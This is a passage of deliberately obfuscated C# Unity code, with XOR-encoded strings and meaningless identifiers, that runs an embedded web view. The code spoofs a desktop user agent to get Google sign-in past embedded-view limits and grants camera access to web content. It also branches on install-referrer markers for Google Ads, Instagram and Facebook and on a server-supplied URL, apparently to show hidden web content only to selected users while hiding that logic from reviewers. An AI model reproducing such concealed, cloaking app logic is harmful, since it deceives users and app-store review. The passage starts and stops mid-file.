_0x4cb14bc7._0x3fe507a8(new byte[48] { 9, 15, 4, 6, 11, 28, 15, 93, 8, 28, 25, 64, 6, 31, 15, 28, 19, 25, 14, 71, 38, 6, 31, 15, 28, 19, 25, 71, 90, 62, 21, 15, 18, 16, 20, 8, 16, 90, 81, 11, 24, 15, 14, 20, 18, 19, 71, 90 }, 125) + _0x836cbed0 + _0x4cb14bc7._0x3fe507a8(new byte[35] { 246, 172, 253, 170, 179, 163, 176, 191, 181, 235, 246, 150, 190, 190, 182, 189, 180, 241, 146, 185, 163, 190, 188, 180, 246, 253, 167, 180, 163, 162, 184, 190, 191, 235, 246 }, 209) + _0x836cbed0 + _0x4cb14bc7._0x3fe507a8(new byte[238] { 208, 138, 219, 140, 149, 133, 150, 153, 147, 205, 208, 185, 152, 131, 202, 182, 200, 181, 133, 150, 153, 147, 208, 219, 129, 146, 133, 132, 158, 152, 153, 205, 208, 197, 195, 208, 138, 170, 219, 154, 152, 149, 158, 155, 146, 205, 131, 133, 130, 146, 219, 135, 155, 150, 131, 145, 152, 133, 154, 205, 208, 182, 153, 147, 133, 152, 158, 147, 208, 219, 144, 146, 131, 191, 158, 144, 159, 178, 153, 131, 133, 152, 135, 142, 161, 150, 155, 130, 146, 132, 205, 145, 130, 153, 148, 131, 158, 152, 153, 223, 222, 140, 133, 146, 131, 130, 133, 153, 215, 167, 133, 152, 154, 158, 132, 146, 217, 133, 146, 132, 152, 155, 129, 146, 223, 140, 150, 133, 148, 159, 158, 131, 146, 148, 131, 130, 133, 146, 205, 208, 150, 133, 154, 208, 219, 149, 158, 131, 153, 146, 132, 132, 205, 208, 193, 195, 208, 219, 154, 152, 149, 158, 155, 146, 205, 131, 133, 130, 146, 219, 154, 152, 147, 146, 155, 205, 208, 208, 219, 135, 155, 150, 131, 145, 152, 133, 154, 205, 208, 182, 153, 147, 133, 152, 158, 147, 208, 219, 135, 155, 150, 131, 145, 152, 133, 154, 161, 146, 133, 132, 158, 152, 153, 205, 208, 198, 195, 217, 199, 217, 199, 208, 219, 130, 150, 177, 130, 155, 155, 161, 146, 133, 132, 158, 152, 153, 205, 208 }, 247) + _0x836cbed0 + _0x4cb14bc7._0x3fe507a8(new byte[117] { 177, 175, 177, 175, 177, 175, 184, 226, 182, 164, 226, 226, 164, 208, 253, 245, 250, 252, 235, 177, 251, 250, 249, 246, 241, 250, 207, 237, 240, 239, 250, 237, 235, 230, 183, 239, 237, 240, 235, 240, 179, 184, 234, 236, 250, 237, 222, 248, 250, 241, 235, 219, 254, 235, 254, 184, 179, 228, 248, 250, 235, 165, 249, 234, 241, 252, 235, 246, 240, 241, 183, 182, 228, 237, 250, 235, 234, 237, 241, 191, 234, 254, 251, 164, 226, 179, 252, 240, 241, 249, 246, 248, 234, 237, 254, 253, 243, 250, 165, 235, 237, 234, 250, 226, 182, 164, 226, 252, 254, 235, 252, 247, 183, 250, 182, 228, 226 }, 159) + _0x4cb14bc7._0x3fe507a8(new byte[5] { 9, 93, 92, 93, 79 }, 116);
    }

    private void _0x112b7e93(string _0x89fc68ab)
    {
        _0x03977c36();
        StartCoroutine(_0xd836fa39(_0x89fc68ab));
    }

    private void _0x6b7e34fa(UniWebView _0xfae3fd91)
    {
        if (_0xebf2d61f)
            return;
        _0xebf2d61f = true;
        _0xfae3fd91.AddUrlScheme(_0x4cb14bc7._0x3fe507a8(new byte[2] { 128, 147 }, 244));
        _0xfae3fd91.AddUrlScheme(_0x4cb14bc7._0x3fe507a8(new byte[6] { 10, 13, 23, 6, 13, 23 }, 99));
        _0xfae3fd91.AddUrlScheme(_0x4cb14bc7._0x3fe507a8(new byte[6] { 122, 118, 101, 124, 114, 99 }, 23));
        _0xfae3fd91.OnMessageReceived += (_0xed44932e, _0xc5f42757) =>
        {
            if (TryOpenExternalLikeChrome(_0xc5f42757.RawMessage))
            {
                _0xa94fcee3(false);
                return;
            }
        };
        _0xfae3fd91.RegisterShouldHandleRequest(_0x1c96459e =>
        {
            string _0xe57aa4ad = _0x1c96459e != null ? _0x1c96459e.Url : string.Empty;
            if (string.IsNullOrEmpty(_0xe57aa4ad))
                return true;
            WLog(_0x4cb14bc7._0x3fe507a8(new byte[21] { 35, 24, 31, 5, 28, 20, 56, 17, 30, 20, 28, 21, 34, 21, 1, 5, 21, 3, 4, 74, 80 }, 112) + _0xe57aa4ad);
            if (TryOpenExternalLikeChrome(_0xe57aa4ad))
            {
                _0xa94fcee3(false);
                return false;
            }

            if (_0x1c96459e != null && _0x1c96459e.IsMainFrame && IsGoogleAuthFlowUrl(_0xe57aa4ad) && !_0x50ff8d02)
            {
                WLog(_0x4cb14bc7._0x3fe507a8(new byte[62] { 169, 133, 141, 138, 196, 179, 129, 134, 178, 141, 129, 147, 196, 128, 129, 144, 129, 135, 144, 129, 128, 196, 163, 139, 139, 131, 136, 129, 196, 133, 145, 144, 140, 196, 177, 182, 168, 196, 201, 218, 196, 150, 129, 136, 139, 133, 128, 196, 147, 141, 144, 140, 196, 163, 139, 139, 131, 136, 129, 196, 177, 165 }, 228));
                _0x50ff8d02 = true;
                _0xa94fcee3(true);
                _0x287240ce.SetUserAgent(_0x72539260());
                _0x287240ce.Load(_0xe57aa4ad);
                return false;
            }

            return true;
        });
        _0xfae3fd91.OnLoadingErrorReceived += (_0xed44932e, _0xe780b9fc, _0xc5f42757, _0x24b7d521) =>
        {
            WLog(_0x4cb14bc7._0x3fe507a8(new byte[25] { 46, 2, 10, 13, 67, 52, 6, 1, 53, 10, 6, 20, 67, 38, 17, 17, 12, 17, 89, 67, 0, 12, 7, 6, 94 }, 99) + _0xe780b9fc + _0x4cb14bc7._0x3fe507a8(new byte[9] { 130, 207, 199, 209, 209, 195, 197, 199, 159 }, 162) + _0xc5f42757);
            string _0xffcefe62 = GetFailingUrl(_0x24b7d521);
            if (string.IsNullOrEmpty(_0xffcefe62) || IsAboutBlank(_0xffcefe62))
                return;
            _ = _0xd9635029(_0x4cb14bc7._0x3fe507a8(new byte[8] { 168, 169, 128, 186, 173, 173, 176, 173 }, 223));
            WLog(_0x4cb14bc7._0x3fe507a8(new byte[45] { 32, 12, 4, 3, 77, 58, 8, 15, 59, 4, 8, 26, 77, 11, 12, 4, 1, 4, 3, 10, 77, 56, 63, 33, 77, 64, 83, 77, 2, 29, 8, 3, 77, 8, 21, 25, 8, 31, 3, 12, 1, 1, 20, 87, 77 }, 109) + _0xffcefe62);
            StopCurrentFailedLoad(_0xed44932e);
            _0x75c710ad(_0xffcefe62);
        };
        _0xfae3fd91.OnPageStarted += (_0xed44932e, _0xd00d51c2) =>
        {
            _0xf21fc3d2 = 0;
            if (_0x831b1d9f && IsAboutBlank(_0xd00d51c2))
            {
                WLog(_0x4cb14bc7._0x3fe507a8(new byte[27] { 254, 220, 203, 217, 207, 220, 195, 142, 207, 204, 193, 219, 218, 148, 204, 194, 207, 192, 197, 142, 221, 218, 207, 220, 218, 203, 202 }, 174));
                return;
            }

            WLog(_0x4cb14bc7._0x3fe507a8(new byte[29] { 207, 227, 235, 236, 162, 213, 231, 224, 212, 235, 231, 245, 162, 205, 236, 210, 227, 229, 231, 209, 246, 227, 240, 246, 231, 230, 184, 162, 169 }, 130) + (Time.realtimeSinceStartup - _0x1b85d220).ToString(_0x4cb14bc7._0x3fe507a8(new byte[5] { 97, 127, 97, 97, 97 }, 81)) + _0x4cb14bc7._0x3fe507a8(new byte[2] { 67, 16 }, 48) + _0xd00d51c2);
            if (TryOpenExternalLikeChrome(_0xd00d51c2))
            {
                StopCurrentFailedLoad(_0xed44932e);
                return;
            }

            if (ContainsIgnoreCase(_0xd00d51c2, _0x4cb14bc7._0x3fe507a8(new byte[8] { 75, 70, 70, 78, 1, 78, 95, 95 }, 47)) || ContainsIgnoreCase(_0xd00d51c2, _0x4cb14bc7._0x3fe507a8(new byte[15] { 103, 118, 110, 57, 96, 126, 115, 112, 114, 99, 57, 117, 123, 120, 112 }, 23)) || _0xd00d51c2.StartsWith(_0x4cb14bc7._0x3fe507a8(new byte[25] { 255, 227, 227, 231, 228, 173, 184, 184, 245, 231, 240, 251, 248, 245, 246, 251, 241, 246, 225, 185, 251, 254, 225, 242, 184 }, 151), StringComparison.OrdinalIgnoreCase))
            {
                StopCurrentFailedLoad(_0xed44932e);
                OpenUrlExternally(_0xd00d51c2);
                return;
            }

            if (IsGoogleAuthFlowUrl(_0xd00d51c2))
            {
                _0xa94fcee3(true);
                WLog(_0x4cb14bc7._0x3fe507a8(new byte[41] { 65, 105, 105, 97, 106, 99, 38, 103, 115, 114, 110, 38, 96, 106, 105, 113, 38, 98, 99, 114, 99, 101, 114, 99, 98, 38, 43, 56, 38, 109, 99, 99, 118, 38, 112, 111, 117, 111, 100, 106, 99 }, 6));
                return;
            }

            _0x91927253 = true;
            _0xa94fcee3(true);
            WLog(_0x4cb14bc7._0x3fe507a8(new byte[43] { 177, 131, 132, 176, 143, 131, 145, 198, 138, 137, 135, 130, 143, 136, 129, 201, 148, 131, 130, 143, 148, 131, 133, 146, 143, 136, 129, 198, 203, 216, 198, 141, 131, 131, 150, 198, 144, 143, 149, 143, 132, 138, 131 }, 230));
        };
        _0xfae3fd91.OnPageCommitted += (_0xed44932e, _0xd00d51c2) =>
        {
            if (_0x831b1d9f && IsAboutBlank(_0xd00d51c2))
                return;
            WLog(_0x4cb14bc7._0x3fe507a8(new byte[31] { 170, 134, 142, 137, 199, 176, 130, 133, 177, 142, 130, 144, 199, 168, 137, 183, 134, 128, 130, 164, 136, 138, 138, 142, 147, 147, 130, 131, 221, 199, 204 }, 231) + (Time.realtimeSinceStartup - _0x1b85d220).ToString(_0x4cb14bc7._0x3fe507a8(new byte[5] { 253, 227, 253, 253, 253 }, 205)) + _0x4cb14bc7._0x3fe507a8(new byte[2] { 79, 28 }, 60) + _0xd00d51c2);
            if (!firstLoadShown && IsHttpUrl(_0xd00d51c2))
            {
                firstLoadShown = true;
                _0x91927253 = false;
                _0xa94fcee3(false);
                _0x76f46042();
                _0x5cd497e1();
                _0xed44932e.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0xd9635029(_0x4cb14bc7._0x3fe507a8(new byte[9] { 171, 170, 131, 179, 172, 185, 178, 185, 184 }, 220));
                WLog(_0x4cb14bc7._0x3fe507a8(new byte[39] { 217, 245, 253, 250, 180, 195, 241, 246, 194, 253, 241, 227, 180, 231, 252, 251, 227, 250, 180, 251, 250, 180, 247, 251, 249, 249, 253, 224, 224, 241, 240, 180, 247, 251, 250, 224, 241, 250, 224 }, 148));
            }
        };
        _0xfae3fd91.OnPageProgressChanged += (_0xed44932e, _0x5b148f61) =>
        {
            if (_0x831b1d9f)
                return;
            if (!firstLoadShown && _0x5b148f61 >= 0.65f)
            {
                firstLoadShown = true;
                _0x91927253 = false;
                _0xa94fcee3(false);
                _0x76f46042();
                _0x5cd497e1();
                _0xed44932e.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0xd9635029(_0x4cb14bc7._0x3fe507a8(new byte[9] { 215, 214, 255, 207, 208, 197, 206, 197, 196 }, 160));
                WLog(_0x4cb14bc7._0x3fe507a8(new byte[32] { 19, 63, 55, 48, 126, 9, 59, 60, 8, 55, 59, 41, 126, 45, 54, 49, 41, 48, 126, 60, 39, 126, 46, 44, 49, 57, 44, 59, 45, 45, 100, 126 }, 94) + _0x5b148f61);
            }
        };
        _0xfae3fd91.OnPageFinished += (_0xed44932e, _0xe780b9fc, _0xd00d51c2) =>
        {
            if (_0x831b1d9f && IsAboutBlank(_0xd00d51c2))
            {
                _0x831b1d9f = false;
                WLog(_0x4cb14bc7._0x3fe507a8(new byte[28] { 132, 166, 177, 163, 181, 166, 185, 244, 181, 182, 187, 161, 160, 238, 182, 184, 181, 186, 191, 244, 178, 189, 186, 189, 167, 188, 177, 176 }, 212));
                return;
            }

            WLog(_0x4cb14bc7._0x3fe507a8(new byte[24] { 137, 165, 173, 170, 228, 147, 161, 166, 146, 173, 161, 179, 228, 130, 173, 170, 173, 183, 172, 161, 160, 254, 228, 239 }, 196) + (Time.realtimeSinceStartup - _0x1b85d220).ToString(_0x4cb14bc7._0x3fe507a8(new byte[5] { 147, 141, 147, 147, 147 }, 163)) + _0x4cb14bc7._0x3fe507a8(new byte[7] { 244, 167, 228, 232, 227, 226, 186 }, 135) + _0xe780b9fc + _0x4cb14bc7._0x3fe507a8(new byte[5] { 87, 2, 5, 27, 74 }, 119) + _0xd00d51c2);
            if (!firstLoadShown)
            {
                firstLoadShown = true;
                _0x91927253 = false;
                _0xa94fcee3(false);
                _0x76f46042();
                _0x5cd497e1();
                _0xed44932e.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0xd9635029(_0x4cb14bc7._0x3fe507a8(new byte[9] { 49, 48, 25, 41, 54, 35, 40, 35, 34 }, 70));
                WLog(_0x4cb14bc7._0x3fe507a8(new byte[33] { 80, 124, 116, 115, 61, 74, 120, 127, 75, 116, 120, 106, 61, 123, 116, 111, 110, 105, 61, 113, 114, 124, 121, 61, 126, 114, 112, 109, 113, 120, 105, 120, 121 }, 29));
            }
            else if (_0x91927253)
            {
                _0x91927253 = false;
                _0xa94fcee3(false);
                _0xed44932e.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                WLog(_0x4cb14bc7._0x3fe507a8(new byte[40] { 129, 173, 165, 162, 236, 155, 169, 174, 154, 165, 169, 187, 236, 159, 164, 163, 187, 236, 173, 170, 184, 169, 190, 236, 160, 163, 173, 168, 165, 162, 171, 236, 170, 165, 162, 165, 191, 164, 169, 168 }, 204));
            }
            else
            {
                _0xa94fcee3(false);
            }

            if (_0x50ff8d02 && !IsGoogleAuthFlowUrl(_0xd00d51c2) && !IsGoogleAuthFlowUrl(_0xd00d51c2))
            {
                WLog(_0x4cb14bc7._0x3fe507a8(new byte[48] { 163, 139, 139, 131, 136, 129, 196, 133, 145, 144, 140, 196, 151, 129, 129, 137, 151, 196, 130, 141, 138, 141, 151, 140, 129, 128, 196, 201, 218, 196, 150, 129, 151, 144, 139, 150, 129, 196, 128, 129, 130, 133, 145, 136, 144, 196, 177, 165 }, 228));
                _0x50ff8d02 = false;
                _0x287240ce.SetUserAgent("");
            }
        };
        _0xfae3fd91.OnShouldClose += _0xed44932e =>
        {
            WLog(_0x4cb14bc7._0x3fe507a8(new byte[41] { 150, 153, 168, 190, 185, 144, 237, 128, 172, 164, 163, 237, 154, 168, 175, 155, 164, 168, 186, 237, 130, 163, 158, 165, 162, 184, 161, 169, 142, 161, 162, 190, 168, 237, 164, 163, 187, 162, 166, 168, 169 }, 205));
            _0xa24d553e();
            return false;
        };
        // POPUP HANDLING LOGIC
        _0xfae3fd91.SetPopupPageEventEnabled(true);
        bool _0x76ea3c92 = false;
        bool _0xc054179a = false;
        _0xfae3fd91.OnMultipleWindowOpened += (_0xed44932e, _0xb0b42a1b) =>
        {
            _0xed44932e.ScrollTo(0, 0, false);
            WLog(_0x4cb14bc7._0x3fe507a8(new byte[43] { 94, 81, 96, 118, 113, 88, 37, 72, 100, 108, 107, 37, 82, 96, 103, 83, 108, 96, 114, 37, 72, 112, 105, 113, 108, 117, 105, 96, 82, 108, 107, 97, 106, 114, 37, 74, 117, 96, 107, 96, 97, 63, 37 }, 5) + _0xb0b42a1b);
            var _0x12cce82a = _0xfae3fd91.GetPopupWindow(_0xb0b42a1b);
            if (_0x12cce82a == null)
                return;
            _0xb6217e62.Add(_0x12cce82a);
            Debug.Log($"[Test] Popup ID: {_0x12cce82a.Id}");
            _0x12cce82a.OnPageStarted += (_0x2402968c, _0xd00d51c2) =>
            {
                WLog(_0x4cb14bc7._0x3fe507a8(new byte[36] { 186, 181, 132, 146, 149, 188, 193, 177, 142, 145, 148, 145, 193, 182, 132, 131, 183, 136, 132, 150, 193, 174, 143, 177, 128, 134, 132, 178, 149, 128, 147, 149, 132, 133, 219, 193 }, 225) + _0xd00d51c2);
                _0xf21fc3d2 = 0;
                if (string.IsNullOrEmpty(_0xd00d51c2) || IsAboutBlank(_0xd00d51c2))
                    return;
                if (IsGoogleAuthFlowUrl(_0xd00d51c2))
                {
                    WLog(_0x4cb14bc7._0x3fe507a8(new byte[57] { 148, 155, 170, 188, 187, 146, 239, 159, 160, 191, 186, 191, 239, 136, 160, 160, 168, 163, 170, 239, 174, 186, 187, 167, 239, 169, 163, 160, 184, 239, 226, 241, 239, 188, 191, 160, 160, 169, 239, 136, 160, 160, 168, 163, 170, 239, 140, 167, 189, 160, 162, 170, 239, 154, 142, 245, 239 }, 207) + _0xd00d51c2);
                    _0x76ea3c92 = false;
                    _0x6c3ce96d();
                    if (_0x2402968c != null && _0x2402968c.IsAlive)
                        _0x2402968c.EvaluateJavaScript(_0x8f1756b6());
                    return;
                }

                if (_0x287240ce == null)
                    return;
                if (!_0x76ea3c92)
                {
                    _0x76ea3c92 = true;
                    _0x287240ce.SetUserAgent(WindowsDesktopUserAgent);
                    WLog(_0x4cb14bc7._0x3fe507a8(new byte[39] { 90, 85, 100, 114, 117, 92, 33, 81, 110, 113, 116, 113, 33, 96, 113, 113, 109, 120, 33, 86, 104, 111, 101, 110, 118, 114, 33, 101, 100, 114, 106, 117, 110, 113, 33, 84, 64, 59, 33 }, 1) + _0xd00d51c2);
                }

                if (_0x2402968c != null && _0x2402968c.IsAlive)
                    _0x2402968c.EvaluateJavaScript(_0x3cfc564d());
                if (!_0xc054179a && _0x2402968c != null && _0x2402968c.IsAlive && IsHttpUrl(_0xd00d51c2))
                {
                    _0xc054179a = true;
                }
            };
            _0x12cce82a.OnPageFinished += (_0x2402968c, _0x24b7d521) =>
            {
                string _0x18bf51a7 = _0x24b7d521 != null ? _0x24b7d521.data : string.Empty;
                WLog(_0x4cb14bc7._0x3fe507a8(new byte[35] { 67, 76, 125, 107, 108, 69, 56, 72, 119, 104, 109, 104, 56, 79, 125, 122, 78, 113, 125, 111, 56, 94, 113, 118, 113, 107, 112, 125, 124, 34, 56, 109, 106, 116, 37 }, 24) + _0x18bf51a7);
                if (_0x2402968c == null || !_0x2402968c.IsAlive)
                    return;
                if (IsGoogleAuthFlowUrl(_0x18bf51a7))
                {
                    _0x6c3ce96d();
                    _0x2402968c.EvaluateJavaScript(_0x8f1756b6());
                    return;
                }

                if (!_0x76ea3c92)
                    return;
                _0x2402968c.EvaluateJavaScript(_0x3cfc564d());
            };
        };
        _0xfae3fd91.OnMultipleWindowClosed += (_0xed44932e, _0xb0b42a1b) =>
        {
            _0xb6217e62.RemoveAll(_0xf77eab0d => _0xf77eab0d == null || _0xf77eab0d.Id == _0xb0b42a1b || !_0xf77eab0d.IsAlive);
            _0xa94fcee3(false);
            if (_0xb6217e62.Count == 0 && _0x287240ce != null)
            {
                _0x76ea3c92 = false;
                _0xc054179a = false;
                _0x34f3339d();
            }

            WLog(_0x4cb14bc7._0x3fe507a8(new byte[43] { 73, 70, 119, 97, 102, 79, 50, 95, 115, 123, 124, 50, 69, 119, 112, 68, 123, 119, 101, 50, 95, 103, 126, 102, 123, 98, 126, 119, 69, 123, 124, 118, 125, 101, 50, 81, 126, 125, 97, 119, 118, 40, 50 }, 18) + _0xb0b42a1b);
        };
        _0xfae3fd91.RegisterOnRequestMediaCapturePermission(_0x1c96459e =>
        {
            if (!Permission.HasUserAuthorizedPermission(Permission.Camera))
            {
                Permission.RequestUserPermission(Permission.Camera);
                return UniWebViewMediaCapturePermissionDecision.Prompt;
            }

            return UniWebViewMediaCapturePermissionDecision.Grant;
        });
    }

    private string _0x71abd4af()
    {
        string _0x15638db3 = _0x4cb14bc7._0x3fe507a8(new byte[62] { 239, 236, 237, 234, 235, 232, 233, 230, 231, 228, 229, 226, 227, 224, 225, 254, 255, 252, 253, 250, 251, 248, 249, 246, 247, 244, 207, 204, 205, 202, 203, 200, 201, 198, 199, 196, 197, 194, 195, 192, 193, 222, 223, 220, 221, 218, 219, 216, 217, 214, 215, 212, 190, 191, 188, 189, 186, 187, 184, 185, 182, 183 }, 142);
        System.Random _0x246799e7 = new System.Random();
        int _0xf112e4d3 = _0x246799e7.Next(8, 16);
        return new string (Enumerable.Repeat(_0x15638db3, _0xf112e4d3).Select(_0xb7f2ed9f => _0xb7f2ed9f[_0x246799e7.Next(_0xb7f2ed9f.Length)]).ToArray());
    }

    private void _0x76f46042()
    {
        if (Camera.main == null)
            return;
        Camera.main.cullingMask = 0;
        Camera.main.clearFlags = CameraClearFlags.SolidColor;
        Camera.main.backgroundColor = Color.black;
    }

    private static bool IsPrivacyItemTrue(Item _0xd9f3e758)
    {
        if (_0xd9f3e758.Key != _0x4cb14bc7._0x3fe507a8(new byte[9] { 172, 182, 149, 183, 172, 179, 164, 166, 188 }, 197))
            return false;
        try
        {
            var _0xdae2463e = _0xd9f3e758.Value.GetAs<object>();
            return _0xdae2463e switch
            {
                bool b => b,
                string s when bool.TryParse(s, out var parsed) => parsed,
                _ => false
            };
        }
        catch
        {
            return false;
        }
    }

    private string _0x10614173 = "";
    private void _0xcfa1329c(string _0x623ebae1)
    {
        bool _0x4dc60803 = !string.IsNullOrEmpty(_0x623ebae1);
        if (_0x4dc60803)
        {
            {
#if B_LOGS
                Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[13] { 162, 173, 156, 138, 141, 164, 217, 170, 145, 150, 142, 195, 217 }, 249) + _0x623ebae1);
#endif
            }

            _0x112b7e93(_0x623ebae1);
            return;
        }
        else
        {
            {
#if B_LOGS
                Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[39] { 234, 229, 212, 194, 197, 236, 145, 247, 208, 221, 221, 211, 208, 210, 218, 145, 83, 55, 35, 145, 246, 208, 220, 212, 145, 153, 223, 222, 145, 215, 216, 223, 208, 221, 145, 228, 227, 253, 152 }, 177));
#endif
            }

            _0x01a2c31c();
            return;
        }
    }

    private async Task _0x8087acf4()
    {
        if (await _0xa2096361())
            return;
        if (await _0x55ae829a())
            return;
        if (await _0x60f0e1ea())
            return;
        _0xff561c91();
        await _0x1ee5bfa1(_0xabb977cc());
        _0x410d6bb6 = await _0x69643da2();
        await _0xcfd3444f();
    }

    private bool _0xf17412b9()
    {
        if (_0xc11d37df())
            return true;
        if (_0x287240ce != null && _0x287240ce.CanGoBack)
        {
            WLog(_0x4cb14bc7._0x3fe507a8(new byte[36] { 142, 167, 180, 162, 177, 167, 180, 163, 230, 164, 167, 165, 173, 230, 235, 248, 230, 171, 167, 175, 168, 230, 145, 163, 164, 144, 175, 163, 177, 230, 129, 169, 132, 167, 165, 173 }, 198));
            _0x287240ce.GoBack();
            return true;
        }

        return false;
    }

    private Text _0x09e0d31a;
    private bool _0x53c7e7e4(int _0x372afef5, string _0x0dbd8f7d, string _0x62236297)
    {
        if (string.IsNullOrEmpty(_0x62236297))
            return false;
        if (!IsHttpUrl(_0x62236297))
            return true;
        if (string.IsNullOrEmpty(_0x0dbd8f7d))
            return false;
        return _0x0dbd8f7d.IndexOf(_0x4cb14bc7._0x3fe507a8(new byte[20] { 9, 30, 30, 19, 15, 3, 2, 2, 9, 15, 24, 5, 3, 2, 19, 30, 9, 31, 9, 24 }, 76), StringComparison.OrdinalIgnoreCase) >= 0 || _0x0dbd8f7d.IndexOf(_0x4cb14bc7._0x3fe507a8(new byte[22] { 60, 43, 43, 38, 58, 54, 55, 55, 60, 58, 45, 48, 54, 55, 38, 43, 60, 63, 44, 42, 60, 61 }, 121), StringComparison.OrdinalIgnoreCase) >= 0 || _0x0dbd8f7d.IndexOf(_0x4cb14bc7._0x3fe507a8(new byte[21] { 252, 235, 235, 230, 250, 246, 247, 247, 252, 250, 237, 240, 246, 247, 230, 250, 245, 246, 234, 252, 253 }, 185), StringComparison.OrdinalIgnoreCase) >= 0 || _0x0dbd8f7d.IndexOf(_0x4cb14bc7._0x3fe507a8(new byte[22] { 37, 50, 50, 63, 53, 46, 43, 46, 47, 55, 46, 63, 53, 50, 44, 63, 51, 35, 40, 37, 45, 37 }, 96), StringComparison.OrdinalIgnoreCase) >= 0;
    }

    private IEnumerator _0xabb977cc()
    {
        {
#if B_LOGS
            {
                Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[26] { 35, 44, 29, 11, 12, 37, 88, 49, 22, 17, 12, 17, 25, 20, 17, 2, 29, 42, 29, 30, 30, 29, 10, 29, 10, 88 }, 120));
            }
#endif
        }

        bool _0xc04c4233 = false;
        InstallReferrer.GetReferrer((_0x66d4f117) =>
        {
            Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[24] { 178, 189, 140, 154, 157, 201, 187, 140, 143, 140, 155, 155, 140, 155, 180, 201, 142, 140, 157, 201, 11, 111, 123, 201 }, 233) + _0x6ee848e3);
            if (_0x66d4f117.IsSuccess)
            {
                _0x6ee848e3 = _0x66d4f117.InstallReferrer ?? "";
                {
#if B_LOGS
                    Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[28] { 74, 69, 116, 98, 101, 49, 67, 116, 119, 116, 99, 99, 116, 99, 76, 49, 66, 100, 114, 114, 116, 98, 98, 49, 243, 151, 131, 49 }, 17) + _0x6ee848e3);
#endif
                }
            }
            else
            {
                {
#if B_LOGS
                    Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[27] { 138, 133, 180, 162, 165, 241, 131, 180, 183, 180, 163, 163, 180, 163, 140, 241, 151, 176, 184, 189, 180, 181, 241, 51, 87, 67, 241 }, 209) + _0x66d4f117);
#endif
                }

                _0x6ee848e3 = "";
            }

            _0xfdbf47ac = true;
        });
        StartCoroutine(_0x6cd7e2ab(2f));
        yield return new WaitUntil(() => _0xfdbf47ac);
        {
#if B_LOGS
            Debug.Log($"[Test] check google atr {_0x6ee848e3}");
#endif
        }

        bool _0x5530e670 = _0x6ee848e3.Contains(_0x4cb14bc7._0x3fe507a8(new byte[6] { 95, 91, 84, 81, 92, 5 }, 56));
        _0xc04c4233 = _0x5530e670 || _0x6ee848e3.Contains(_0x4cb14bc7._0x3fe507a8(new byte[18] { 120, 105, 105, 106, 55, 112, 119, 106, 109, 120, 126, 107, 120, 116, 55, 122, 118, 116 }, 25)) || _0x6ee848e3.Contains(_0x4cb14bc7._0x3fe507a8(new byte[17] { 175, 190, 190, 189, 224, 168, 175, 173, 171, 172, 161, 161, 165, 224, 173, 161, 163 }, 206));
        _0xd2f07fcd = _0x5530e670 ? "" : (_0xc04c4233 ? "" : _0xd2f07fcd);
        _0xd2f07fcd = _0xd2f07fcd ?? "";
        _0x9f107ed5 = _0x9f107ed5 ?? "";
        {
#if B_LOGS
            Debug.Log($"[Test] oneLinkData (FB): {_0xd2f07fcd}");
#endif
        }
    }

    private void WLog(string _0xc8818fda)
    {
#if B_LOGS
        {
            Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[7] { 45, 34, 19, 5, 2, 43, 86 }, 118) + _0xc8818fda);
        }
#endif
    }

    private async Task<bool> _0x60f0e1ea()
    {
        {
#if B_LOGS
            Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[29] { 72, 71, 118, 96, 103, 78, 51, 90, 96, 67, 97, 122, 101, 114, 112, 106, 82, 125, 119, 64, 114, 101, 118, 119, 80, 123, 118, 112, 120 }, 19));
#endif
        }

        string _0x46d1ce73 = "";
        for (int _0x9d18cf13 = 0; _0x9d18cf13 < 2; _0x9d18cf13++)
        {
            if (await _0x97276888(1, 100))
            {
                await _0xd9635029(_0x4cb14bc7._0x3fe507a8(new byte[7] { 114, 124, 127, 115, 123, 117, 116 }, 16));
                _0x01a2c31c();
                return true;
            }

            _0x46d1ce73 = await _0xd3f8bea1(1, 100);
            if (!string.IsNullOrEmpty(_0x46d1ce73))
                break;
        }

        try
        {
            if (!string.IsNullOrEmpty(_0x46d1ce73))
            {
                if (!string.IsNullOrEmpty(_0x398c5835))
                {
                    _0x46d1ce73 = _0x9857d99a(_0x46d1ce73, _0x398c5835);
                    {
#if B_LOGS
                        Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[53] { 197, 202, 251, 237, 234, 195, 190, 221, 255, 253, 246, 251, 250, 190, 248, 247, 240, 255, 242, 203, 236, 242, 190, 233, 247, 234, 246, 190, 237, 251, 240, 250, 247, 250, 190, 124, 24, 12, 190, 237, 246, 241, 233, 190, 201, 251, 252, 200, 247, 251, 233, 164, 190 }, 158) + _0x46d1ce73);
#endif
                    }
                }
                else
                {
                    {
#if B_LOGS
                        Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[39] { 165, 170, 155, 141, 138, 163, 222, 189, 159, 157, 150, 155, 154, 222, 152, 151, 144, 159, 146, 171, 140, 146, 222, 28, 120, 108, 222, 141, 150, 145, 137, 222, 169, 155, 156, 168, 151, 155, 137 }, 254));
#endif
                    }
                }

                _0x6cf507ac = true;
                _0x112b7e93(_0x46d1ce73);
                return true;
            }

            return false;
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[44] { 2, 13, 60, 42, 45, 4, 121, 28, 33, 58, 60, 41, 45, 48, 54, 55, 121, 46, 49, 48, 53, 60, 121, 58, 49, 60, 58, 50, 48, 55, 62, 121, 42, 56, 47, 60, 61, 121, 53, 48, 55, 50, 99, 121 }, 89) + e.Message);
                }
#endif
            }

            return true;
        }
    }

    private string _0x9857d99a(string _0x642e6d26, string _0x79083906)
    {
        if (string.IsNullOrEmpty(_0x79083906))
            return _0x642e6d26;
        if (_0x642e6d26.Contains(_0x4cb14bc7._0x3fe507a8(new byte[1] { 203 }, 244)))
            return _0x642e6d26 + _0x4cb14bc7._0x3fe507a8(new byte[8] { 78, 27, 13, 6, 12, 1, 12, 85 }, 104) + UnityWebRequest.EscapeURL(_0x79083906);
        else
